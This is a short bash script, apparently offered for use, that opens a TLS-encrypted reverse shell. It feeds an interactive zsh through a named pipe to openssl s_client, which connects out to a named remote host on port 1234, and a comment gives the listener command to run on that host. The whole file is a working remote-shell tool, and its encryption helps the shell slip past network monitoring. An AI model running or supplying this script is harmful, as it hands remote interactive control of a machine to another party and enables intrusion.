#!/bin/bash

# script to open an encrypted reverse shell

# on the remote host, run the following:
# sudo openssl s_server -quiet -key /path/to/privkey.pem -cert /path/to/fullchain.pem -port "$REV_SHELL_PORT"

# variables to control the script
REV_SHELL_FIFO="/tmp/rev_shell"
REV_SHELL_ADDR="cloud.fynns.site"
REV_SHELL_PORT="1234"
REV_SHELL_PROG="/bin/zsh -i"

# create a fresh fifo
rm "$REV_SHELL_FIFO"
mkfifo "$REV_SHELL_FIFO"

# run the fifo input through zsh and send the output back
# NOTE: REV_SHELL_PROG isn't quoted by design
cat "$REV_SHELL_FIFO" \
  |  $REV_SHELL_PROG 2>&1 \
  | openssl s_client -quiet -connect "${REV_SHELL_ADDR}:${REV_SHELL_PORT}" \
> "$REV_SHELL_FIFO"
